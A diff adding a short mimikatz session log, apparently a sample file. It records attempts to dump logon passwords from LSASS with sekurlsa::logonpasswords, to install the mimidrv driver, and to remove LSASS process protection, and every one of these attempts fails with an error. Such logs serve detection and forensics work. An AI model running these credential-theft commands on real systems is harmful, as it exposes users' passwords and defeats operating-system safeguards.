@@ -1,0 +1,23 @@
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+mimikatz # !+
+[*] 'mimidrv' service not present
+[+] 'mimidrv' service successfully registered
+[+] 'mimidrv' service ACL to everyone
+ERROR kull_m_service_install ; StartService (0x800b010c)
+
+mimikatz # !processprotect /process:lsass.exe /remove
+Process : lsass.exe
+PID 1176 -> 00/00 [0-0-0]
+ERROR kull_m_kernel_ioctl ; CreateFile (0x00000002)
+
+mimikatz # sekurlsa::logonpasswords
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+mimikatz # 
